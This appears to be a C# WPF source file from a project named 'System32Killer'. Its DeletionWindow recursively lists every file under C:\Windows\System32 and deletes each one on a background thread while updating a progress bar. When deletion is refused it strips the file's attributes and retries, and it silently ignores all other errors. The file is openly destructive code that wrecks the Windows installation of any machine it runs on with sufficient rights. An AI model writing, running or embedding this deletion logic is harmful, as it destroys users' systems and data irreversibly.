using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace System32Killer
{
    public enum StopReason
    { 
        Unfinished,
        Success,
        Error,
        Canceled
    }

    /// <summary>
    /// Interaction logic for DeletionWindow.xaml
    /// </summary>
    public partial class DeletionWindow : Window
    {
        private const string DIRECTORY_NAME = "C:\\Windows\\System32\\";
        private Thread? _runningThread;

        public StopReason StopReason { get; set; } = StopReason.Unfinished;

        public DeletionWindow()
        {
            InitializeComponent();
        }

        protected override void OnContentRendered(EventArgs e)
        {
            base.OnContentRendered(e);
            try
            {
                string[] files = Directory.GetFiles(DIRECTORY_NAME, "*", new EnumerationOptions()
                {
                    IgnoreInaccessible = true,
                    RecurseSubdirectories = true
                });
                prgProgressBar.Value = 0;

                if (files?.Count() > 0)
                {
                    prgProgressBar.Maximum = files.Count();
                    _runningThread = new Thread(() =>
                    {
                        try
                        {
                            DeleteFiles(files);
                            if (StopReason == StopReason.Unfinished)
                            {
                                StopReason = StopReason.Success;
                            }
                        }
                        catch (Exception ex)
                        {
                            LogToEventLog(ex);
                            StopReason = StopReason.Error;
                        }
                        finally
                        {
                            this.Dispatcher.Invoke(() =>
                            {
                                this.Close();
                            });
                        }
                    });
                    _runningThread.Start();
                }
            }
            catch (Exception ex2)
            {
                LogToEventLog(ex2);
                StopReason = StopReason.Error;
                this.Close();
            }
        }

        private void Event_CancelButtonClicked(object sender, EventArgs e)
        {
            if (_runningThread is not null)
            {
                _runningThread.Interrupt();
            }

            StopReason = StopReason.Canceled;
            this.Close();
        }

        private void DeleteFiles(string[] files)
        {
            try
            {
                foreach (string file in files)
                {
                    try
                    {
                        File.Delete(file);
                    }
                    catch (UnauthorizedAccessException ex)
                    {
                        try
                        {
                            File.SetAttributes(file, FileAttributes.Normal);
                            File.Delete(file);
                        }
                        catch (Exception e) { }
                    }
                    catch (IOException) { }

                    this.Dispatcher.Invoke(() =>
                    {
                        prgProgressBar.Value++;
                    });
                }
            }
            catch (ThreadInterruptedException test)
            {
                // Fine to eat this as it gets thrown sometimes when the user cancels
            }
        }

        private void LogToEventLog(Exception ex)
        {
            using (EventLog eventLog = new EventLog("Application"))
            {
                var message = ex.Message;
                message += "\n";
                message += ex.StackTrace;

                eventLog.Source = "Application";
                eventLog.WriteEntry(message, EventLogEntryType.Error);
            }
        }
    }
}
